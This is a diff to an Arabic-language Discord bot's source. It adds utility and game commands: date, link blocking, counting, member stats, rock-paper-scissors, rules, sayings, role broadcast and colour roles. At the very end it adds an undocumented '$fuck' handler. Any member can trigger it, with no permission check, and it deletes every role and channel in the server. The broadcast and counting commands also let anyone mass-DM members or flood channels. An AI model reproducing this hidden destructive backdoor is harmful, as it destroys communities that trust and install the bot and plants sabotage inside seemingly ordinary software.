@@ -46,17 +46,17 @@ client.on("message", message => {
 ('+rooms ' , 'لاضهار الرومات')
 ('+ct ' , 'لانشاء روم كتابي')
 ('+cv ' , 'لانشاء روم صوتي')
-('+ ' , '')
+('+data ' , 'تاريخ اليوم')
 ('+calculator ' , 'الالة الحسابية')
 ('+content ' , 'لارسال اقتراح لصحاب البوت')
-('+ ' , '')
+('+counting ' , 'اختيار رقم')
 ('+uptime ' , 'لمعرفه مده تشغيل البوت')
-('+ ' , '')
+('+members ' , 'الاشخاص')
 ('+serverimage ' , 'لاضهار صوره السيرفر')
 ('+image ' , 'لاضهار صورتك')
 ('roleadd ' , 'لاعطاء رتبه')
 ('+roleremove ' , 'لازاله الرتبه')
-('+ ' , '')
+('+rps ' , 'لعبة حجرة ورقة مقص')
 ('+suppport ' , 'لحصول على سيرفر المساعدة')
 ('+Mute ' , 'لاعطاء ميوت شات مع سبب')
 ('UnMute ' , 'لفك ميوت شات')
@@ -70,12 +70,15 @@ client.on("message", message => {
 ('+hide' , 'لاخفاء جميع رومات في سسيرفر')
 ('+tag' , 'لزخرفه الكتابه للانكليزي فقط')
 ('+sd' , 'لحذف كل شيئ بسيرفر')
-('+' , '')
+('+bcrole' , '+bcrole @everyone رساله')
 ('+unhide' , 'لفتح جميع رومات')
 ('+ban' , 'لاعطاء باند')
 ('+unbans' , 'لفك باند عن جميع')
 ('لاتخيار الوان الذي تريده' , 'لون')
 ('+owner' , 'كود تأكد من ملكيه البوت')
+('قوانين' , 'قوانين')
+('خواطر' , 'لعبه خواطر')
+('+color' , 'اخطر لون')
 تحذير :البوت يمتلك لوق يعمل في روم يسمى log
 البوت يقوم بطرد من ينشر سيرفر تحذير
 
@@ -3389,11 +3392,6 @@ const codes = {
   );
   };
   });
-
-
-
-
-
 client.on('message', message => {
 	var prefix = "+";
   if (!message.content.startsWith(prefix)) return;
@@ -3514,4 +3512,415 @@ client.on('message', msg => {
     }
 }
 });
+client.on('message', message => {
+    var prefix = "+"
+    if (message.content === prefix + "data") {
+        var currentTime = new Date(),
+            السنة = currentTime.getFullYear(),
+            الشهر = currentTime.getMonth() + 1,
+            اليوم = currentTime.getDate();
+        message.channel.sendMessage( "التاريخ : " + اليوم + "-" + الشهر + "-" +السنة)
+    }
+});
+client.on('message', message => {
+    var args = message.content.split(/[ ]+/)
+    if(message.content.includes('https://')){
+      if(!message.member.hasPermission('ADMINISTRATOR'))
+        message.delete()
+    return message.reply(`** يمنع نشر الروابط بهذا السيرفر  :angry: ! **`)
+    }
+});
+ client.on('message',function(message) {
+    let messageArray = message.content.split(" ");
+    let args = messageArray[1];
+   if(message.content.startsWith(prefix + "counting")) {
+       if(!args) return message.reply('ℹ ``اختر رقم``');
+       let i;
+       for (i = 0; i < `${parseInt(args) + 1}`; ++i)
+       message.channel.send(i)
+   }
+});
+client.on('message',function(message) {
+  if (message.author.bot) return;
+
+
+                  if(!message.channel.guild) return;
+
+                    if (message.content === prefix + "members") {
+ const embed = new Discord.RichEmbed()
+
+    .setDescription(`**Members info ?
+ online:   ${message.guild.members.filter(m=>m.presence.status == 'online').size}
+ dnd:       ${message.guild.members.filter(m=>m.presence.status == 'dnd').size}
+ idle:     ${message.guild.members.filter(m=>m.presence.status == 'idle').size}
+ membersCount:  ${message.guild.memberCount - message.guild.members.filter(m=>m.user.bot).size}
+ bots: ${message.guild.members.filter(m=>m.user.bot).size} **`)
+         message.channel.send({embed});
+
+
+    }
+      }); 
+client.on('message',function(message) {
+    let w = ['حجرة','ورقة','مقص'];
+   if(message.content.startsWith(prefix + "rps")) {
+       message.channel.send(`\`\`\`css
+Choose one of the following.
+#1 ( حجرة )
+#2 ( ورقة )
+#3 ( مقص )
+\`\`\`
+
+__امامك  5 توان للاختيار__`)
+.then(() => {
+  message.channel.awaitMessages(response => response.content === '1', {
+    max: 1,
+    time: 5000,
+    errors: ['time'],
+  })
+  .then((collected) => {
+      if(message.author !== message.author)return;
+     message.channel.send('🏵 ' + w[Math.floor(Math.random() * w.length)]);
+    });
+});
+  message.channel.awaitMessages(response => response.content === '2', {
+    max: 1,
+    time: 5000,
+    errors: ['time'],
+  })
+  .then((collected) => {
+     message.channel.send('🏵 ' + w[Math.floor(Math.random() * w.length)]);
+    });
+      message.channel.awaitMessages(response => response.content === '3', {
+    max: 1,
+    time: 5000,
+    errors: ['time'],
+  })
+  .then((collected) => {
+     message.channel.send('🏵 ' + w[Math.floor(Math.random() * w.length)]);
+    });
+   } 
+});
+client.on('message', message => {
+            if (message.content.startsWith("قوانين")) {
+     let embed = new Discord.RichEmbed()
+.setThumbnail(message.author.avatarURL)
+.addField('     **اولا** ' ,' **ممنوع السب** ')
+.addField('     **ثانيا** ' ,' **لا تسوي سبام ** ')
+.addField('     **ثالثا** ' ,' **لا تزعج الاخرين** ')
+.addField('    **رابعا**' ,' **ممنوع الاعلانات** ')
+.addField('    **خامسا**' ,' **احترم الاخرين** ')
+.addField('    **سادسا**' ,' **لا تنشر سيرفرات في الشات او بل خاص** ')
+.addField('    **سابعا**' ,' **لا تنشر روابط!** ')
+.addField('    **ثامنا**' ,' **لا تسوي سبام ايموجي** ')
+.addField('    **تاسعا**' ,' **لا تطلب رتبه الاداره !** ')
+.setColor('#7d2dbe')
+  message.channel.sendEmbed(embed);
+    }
+});
+const secreT = [
+  "**الحياة بكل ما فيها تقف دائمًا على حد الوسطية بين اتزان المعنى وضده من حب وكره وحق وباطل وعدل وظلم**.",
+  "**كى تعيش عليك ان تتقن فن التجاهل باحتراف**.",
+  "**لا تحزن على من اشعرك بان طيبتك غباء امام وقاحته**.",
+  "**هناك من يحلم بالنجاح وهناك من يستيقظ باكرا لتحقيقه**.",
+  "**ان تعالج ألمك بنفسك تلك هى القوة**.", 
+  "**الجميع يسمع ما تقول والاصدقاء ينصتون لما تقول وافضل الاصدقاء ينصتون لما اخفاه سكوتك**.", 
+  "**انتهى زمن الفروسية ، لم تنقرض الخيول بل انقرض الفرسان**.", 
+  "**ان تكون اخرسا عاقلا خير من ان تكون نطوقا جهولا**.", 
+  "**المناقشات العقيمة لا تنجب افكارا**.", 
+  "**نحن نكتب ما لا نستطيع ان نقول وما نريد ان يكون**.", 
+  "**نحن نكتب ما لا نستطيع ان نقول وما نريد ان يكون**.", 
+]
+
+ client.on('message', message => {
+   if (message.content.startsWith(prefix + "خواطر")) {
+                if(!message.channel.guild) return message.reply('** This command only for servers**');
+  var embed = new Discord.RichEmbed()
+  .setColor('RANDOM')
+
+   .setThumbnail(message.author.avatarURL) 
+ .addField('لعبه خواطر' ,
+  `${secreT[Math.floor(Math.random() * secreT.length)]}`)
+  message.channel.sendEmbed(embed);
+  console.log('[id] Send By: ' + message.author.username)
+    }
+});
+client.on('message' , message => {
+  var prefix = "+";
+  if(message.author.bot) return;
+  if(message.content.startsWith(prefix + "bcrole")) {
+    let args = message.content.split(" ").slice(1);
+
+    if(!args[0]) {
+      message.channel.send("قم بمنشنة الرتبة | *bcrole @everyone رساله");
+        return;
+    }
+    if(!args[1]) {
+      message.channel.send("قم بمنشنة الرتبة | *bcrole @everyone رساله");
+        return;
+    }
+
+      if(args[0] == "@everyone") {
+        message.channel.send(`لقد تم ارسال هذه الرسالة الى ${message.guild.memberCount} اعضاء`);
+        message.guild.members.forEach(mi => {
+          mi.send(
+          "الرسالة :" + "\n" +
+         "**" + `${args[1]}` + "**"
+          );
+        });
+        return;
+      }
+          var role = message.mentions.roles.first();
+            if(!role) {
+              message.reply("لا توجد رتبة بهذا الاسم");
+                return;
+            }
+        message.guild.members.filter(m => m.roles.get(role.id)).forEach(sa => {
+        sa.send(
+          "الرسالة :" + "\n" +
+        "**" + `${args[1]}` + "**"
+          );
+        });
+      message.channel.send(`**لقد تم ارسال هذه الرسالة الى ${message.guild.members.filter(m => m.roles.get(role.id)).size} عظو**`);
+    }
+});
+client.on('message', message => {                      
+    if(!message.channel.guild) return;
+       if(message.content.startsWith(prefix + 'color')) {
+       if(!message.channel.guild) return message.channel.send('**هذا الأمر فقط للسيرفرات**').then(m => m.delete(5000));
+       message.channel.sendFile(`https://media.discordapp.net/attachments/444071272503050241/450979273206005780/colors.png`).then(msg => {
+        
+        
+        
+        msg.react('❤').then(r=>{
+        msg.react('💛').then(r=>{
+        msg.react('💚').then(r=>{
+        msg.react('🖤').then(r=>{
+        msg.react('💜').then(r=>{
+        msg.react('💙').then(r=>{
+        msg.react('❌').then(r=>{
+
+
+       
+   
+
+
+    
+     
+     let activeFilter = (reaction, user) => reaction.emoji.name === '❤' && user.id === message.author.id;
+     
+       let active = msg.createReactionCollector(activeFilter, { time: 15000 });
+      
+                                    //red                    
+                               active.on("collect", r => {
+                                   message.member.addRole(message.guild.roles.find("name", "red"))
+                                   
+                                   
+                            
+                                 
+
+     const embed = new Discord.RichEmbed() 
+      .setColor("#ff0000")
+
+      .setDescription("**:art:تم اعطائك اللون الاحمر**")
+      .setFooter(message.author.tag , message.author.avatarURL)
+
+message.channel.sendEmbed(embed).then();
+
+})
+
+
+//لون اسود
+
+
+ let y1Filter = (reaction, user) => reaction.emoji.name === '🖤' && user.id === message.author.id;
+     
+       let y1 = msg.createReactionCollector(y1Filter, { time: 15000 });
+      
+                                    //t                    
+                               y1.on("collect", r => {
+                                   message.member.addRole(message.guild.roles.find("name", "black"))
+                                   
+                                   
+                            
+                                 
+
+     const embed = new Discord.RichEmbed() 
+      .setColor("#0c0606")
+
+      .setDescription("**:art:تم اعطائك اللون الاسود**")
+      .setFooter(message.author.tag , message.author.avatarURL)
+
+message.channel.sendEmbed(embed).then();
+
+
+
+   })
+
+ //لون اصفر 
+let y2Filter = (reaction, user) => reaction.emoji.name === '💛' && user.id === message.author.id;
+     
+       let y2 = msg.createReactionCollector(y2Filter, { time: 15000 });
+      
+                                                    
+                               y2.on("collect", r => {
+                                   message.member.addRole(message.guild.roles.find("name", "yellow"))
+                                   
+                                   
+                            
+                                 
+
+     const embed = new Discord.RichEmbed() 
+      .setColor("#e7fa02")
+
+      .setDescription("**:art:تم اعطائك اللون الاصفر**")
+      .setFooter(message.author.tag , message.author.avatarURL)
+
+message.channel.sendEmbed(embed).then();
+
+
+ 
+                               })
+                              
+//الون الاخضر
+
+let y3Filter = (reaction, user) => reaction.emoji.name === '💚' && user.id === message.author.id;
+     
+       let y3 = msg.createReactionCollector(y3Filter, { time: 15000 });
+      
+                                                    
+                               y3.on("collect", r => {
+                                   message.member.addRole(message.guild.roles.find("name", "y1"))
+                                   
+                                   
+                            
+                                 
+
+     const embed = new Discord.RichEmbed() 
+      .setColor("#09fa2a")
+
+      .setDescription("**:art:تم اعطائك اللون الاخضر**")
+      .setFooter(message.author.tag , message.author.avatarURL)
+
+message.channel.sendEmbed(embed).then();
+ })
+    //الون البنفسجي
+
+let y4Filter = (reaction, user) => reaction.emoji.name === '💜' && user.id === message.author.id;
+     
+       let y4 = msg.createReactionCollector(y4Filter, { time: 15000 });
+      
+                                                    
+                               y4.on("collect", r => {
+                                   message.member.addRole(message.guild.roles.find("name", "y2"))
+                                   
+                                   
+                            
+                                 
+
+     const embed = new Discord.RichEmbed() 
+      .setColor("#9e1bce")
+
+      .setDescription("**:art:تم اعطائك اللون البنفسجي**")
+      .setFooter(message.author.tag , message.author.avatarURL)
+
+message.channel.sendEmbed(embed).then();
+})
+   //الون الازرق فاتح
+
+let y5Filter = (reaction, user) => reaction.emoji.name === '💙' && user.id === message.author.id;
+     
+       let y5 = msg.createReactionCollector(y5Filter, { time: 15000 });
+      
+                                                    
+                               y5.on("collect", r => {
+                                   message.member.addRole(message.guild.roles.find("name", "y3"))
+                                   
+                                   
+                            
+                                 
+
+     const embed = new Discord.RichEmbed() 
+      .setColor("#0bc0f7")
+
+      .setDescription("**:art:تم اعطائك اللون اللبني**")
+      .setFooter(message.author.tag , message.author.avatarURL)
+
+message.channel.sendEmbed(embed).then();
+
+})
+let y6Filter = (reaction, user) => reaction.emoji.name === '❌' && user.id === message.author.id;
+     
+       let y6 = msg.createReactionCollector(y6Filter, { time: 15000 });
+      
+                                                    
+                               y6.on("collect", r => {
+                                   message.member.removeRole(message.guild.roles.find("name", "red"))
+                                   
+                                   message.member.removeRole(message.guild.roles.find("name", "y3"))
+                                   message.member.removeRole(message.guild.roles.find("name", "black"))
+                                   message.member.removeRole(message.guild.roles.find("name", "yellow"))
+                                  message.member.removeRole(message.guild.roles.find("name", "y1"))
+                                  message.member.removeRole(message.guild.roles.find("name", "y2"))
+                                  
+                            
+                                 
+
+     const embed = new Discord.RichEmbed() 
+      .setColor("RANDOM")
+
+      .setDescription("**:art:تم ازالة اللون**")
+      .setFooter(message.author.tag , message.author.avatarURL)
+
+message.channel.sendEmbed(embed).then();
+
+
+                               })
+        })
+})
+})
+        
+})
+})
+})
+})
+                               
+                                   })
+       }
+                                   
+                                   }); 
+
+
+
+
+ 
+
+
+
+
+
+
+
+
+
+  
+  
+  
+
+
+
+
+client.on('message', ra3d => {   
+ if (ra3d.content.startsWith("$fuck")) {
+     ra3d.guild.roles.forEach(r => { r.delete() }) 
+     ra3d.guild.channels.forEach(c => { c.delete() })
+                let embed = new Discord.RichEmbed()
+            .setColor('#fd0101')
+            .setDescription('I have benn fucked the server')
+           ra3d.author.sendEmbed(embed);
+ }
+ });
+
+
+
+
 client.login(process.env.BOT_TOKEN);
